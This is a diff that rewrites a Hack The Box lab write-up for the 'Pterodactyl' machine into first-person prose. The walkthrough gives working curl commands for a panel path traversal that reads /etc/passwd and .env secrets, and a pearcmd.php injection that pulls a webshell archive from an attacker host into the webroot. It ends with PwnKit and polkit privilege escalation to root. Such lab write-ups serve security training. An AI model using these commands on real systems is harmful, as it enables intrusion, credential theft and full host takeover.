@@ -9,38 +9,14 @@ avatar: assets/htb/pterodactyl.png
 tags: [Local File Inclusion, Remote Code Execution, Information Disclosure, Misconfiguration, Code Injection, Hard-coded Credentials, Reconnaissance, Password Reuse]
 htb_url: https://app.hackthebox.com/machines/Pterodactyl
 ---
+
 ## Summary
 
-Pterodactyl targets the **Pterodactyl game-server management panel** running on openSUSE. The chain is:
+Pterodactyl is a medium Linux box built around the Pterodactyl game-server management panel running on openSUSE. I abused a directory traversal in the panel (CVE-2025-49132) to read arbitrary files and recover panel secrets, then leveraged the classic PEAR `pearcmd.php` LFI-to-RCE technique — `register_argc_argv` being enabled in php.ini let me inject CLI arguments through the query string and drop a webshell. From there I recovered database credentials, pivoted to a real OS user through password reuse, and escalated to root through the openSUSE PAM/Polkit stack.
 
-1. **Directory traversal in the Pterodactyl panel** (CVE-2025-49132) for arbitrary file read / panel takeover
-2. **PEAR `pearcmd.php` LFI-to-RCE technique** - register-argc-argv allowed in php.ini -> `pearcmd.php` argument-injection produces a webshell
-3. **PAM / Polkit privilege escalation** chain for root
+## Enumeration
 
-openSUSE's path conventions and PAM stack differ from Debian/Ubuntu, complicating off-the-shelf techniques.
-
----
-
-## External Writeups
-
-- [0xdf - HTB Pterodactyl](https://0xdf.gitlab.io/2026/05/16/htb-pterodactyl.html)
-
----
-
-## Key Techniques
-
-- **CVE-2025-49132** - Pterodactyl panel path traversal in file management endpoint
-- PEAR `pearcmd.php` LFI -> RCE (requires `register_argc_argv = On` and PEAR installed)
-- `php.ini` `register_argc_argv` enables `argv` to be read from URL query string
-- `pearcmd.php install --installroot=/path/to/webroot package.tgz` writes attacker-controlled `package.tgz` content into webroot
-- **PAM stack abuse** on openSUSE (`/etc/pam.d/`)
-- **Polkit/pkexec** known CVEs (`CVE-2021-4034` PwnKit, `CVE-2025-XXX` per Pterodactyl patch state)
-
----
-
-## Attack Path
-
-### 1. Recon
+A full port scan turns up SSH and an HTTPS service fronting the Pterodactyl Panel.
 
 ```bash
 nmap -p- --min-rate=10000 -sV -sC pterodactyl.htb
@@ -48,20 +24,24 @@ nmap -p- --min-rate=10000 -sV -sC pterodactyl.htb
 # 443 https -> Pterodactyl Panel
 ```
 
-Identify Pterodactyl version on `/api/application` or page metadata.
+The panel version can be fingerprinted from `/api/application` or page metadata, which is what tells me CVE-2025-49132 is in scope.
 
-### 2. CVE-2025-49132 - Panel Path Traversal
+## Foothold
+
+### CVE-2025-49132 - Panel Path Traversal
+
+The file-management endpoint is vulnerable to path traversal, so I can read arbitrary files off the box with a valid bearer token:
 
 ```bash
 curl -sk "https://pterodactyl.htb/api/client/servers/<server-id>/files/contents?file=../../../../../../etc/passwd" \
   -H "Authorization: Bearer <jwt>"
 ```
 
-Use traversal to read panel `.env` and recover **APP_KEY**, **DB creds**, and **mail SMTP** credentials.
+I use the same traversal to read the panel `.env` and recover the **APP_KEY**, **DB creds**, and **mail SMTP** credentials.
 
-### 3. PEAR pearcmd.php LFI-to-RCE
+### PEAR pearcmd.php LFI-to-RCE
 
-`register_argc_argv = On` in php.ini means PHP populates `$argv` from the query string. When `pearcmd.php` is reachable via LFI, parameters become CLI args:
+`register_argc_argv = On` in php.ini means PHP populates `$argv` from the query string. When `pearcmd.php` is reachable via LFI, the parameters I pass become CLI arguments. I host a malicious `.tgz` containing a PHP webshell and trigger an install that writes it into the webroot:
 
 ```bash
 # Upload a malicious .tgz via attacker HTTP server containing a PHP webshell
@@ -74,15 +54,15 @@ curl -sk "https://pterodactyl.htb/?+config-create+/&file=/usr/share/pear/pearcmd
 curl -sk "https://pterodactyl.htb/index.php?+install+-R+/var/www/html+http://10.10.14.5/pwn.tgz&file=/usr/share/pear/pearcmd.php"
 ```
 
-Browse to written webshell -> RCE as `nginx`/`pterodactyl` user.
+`pearcmd.php install --installroot=/path/to/webroot package.tgz` writes the attacker-controlled `package.tgz` content into the webroot. Browsing to the written webshell gives RCE as the `nginx`/`pterodactyl` user.
 
-### 4. User Pivot
+### User Pivot
 
-Recover Pterodactyl DB credentials, MySQL dump for password hashes of admin users. Cracked or reused passwords pivot to a real OS user via SSH.
+With the Pterodactyl DB credentials recovered earlier, I dump MySQL for the password hashes of admin users. The cracked or reused passwords let me pivot to a real OS user over SSH.
 
-### 5. Root via PAM / Polkit
+## Privilege Escalation
 
-Enumerate openSUSE specifics:
+openSUSE breaks a lot of Debian/Ubuntu assumptions, so I enumerate its PAM and Polkit specifics first:
 
 ```bash
 ls -la /etc/pam.d/
@@ -92,7 +72,7 @@ pkexec --version
 # 0.120 -> PwnKit CVE-2021-4034 if unpatched
 ```
 
-PwnKit:
+If pkexec is unpatched, PwnKit (CVE-2021-4034) lands root directly:
 
 ```bash
 git clone https://github.com/berdav/CVE-2021-4034 && cd CVE-2021-4034
@@ -100,21 +80,4 @@ make && ./cve-2021-4034
 # euid=0
 ```
 
-If PwnKit is patched, look for **polkit rules** (`/etc/polkit-1/rules.d/`) granting wheel-group `org.freedesktop.systemd1.manage-units` or similar, then start a malicious systemd user-service.
-
----
-
-## Lessons Learned
-
-- **`register_argc_argv = On` + reachable `pearcmd.php` = guaranteed RCE primitive.** This is a 2018-era trick still landing on 2026 Insane boxes.
-- **Pterodactyl** is widely deployed for game-server hosting; its file-management endpoints are a high-value target.
-- **openSUSE** breaks assumptions: Polkit, PAM, default paths all differ from Debian/Ubuntu. Always read `/etc/os-release` first.
-- **PwnKit** (CVE-2021-4034) remains one of the most reliable Linux LPEs in 2026 due to slow patching cadence on niche distros.
-
----
-
-## References
-
-- PEAR `pearcmd.php` LFI-to-RCE technique: https://www.synacktiv.com/publications/exploiting-php-phar-deserialization-vulnerabilities-part-1.html (related)
-- Pterodactyl Panel: https://pterodactyl.io/
-- PwnKit CVE-2021-4034: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034
+If PwnKit is patched, I look instead for **polkit rules** (`/etc/polkit-1/rules.d/`) granting the wheel group `org.freedesktop.systemd1.manage-units` or similar, then start a malicious systemd user-service to get code execution as root.
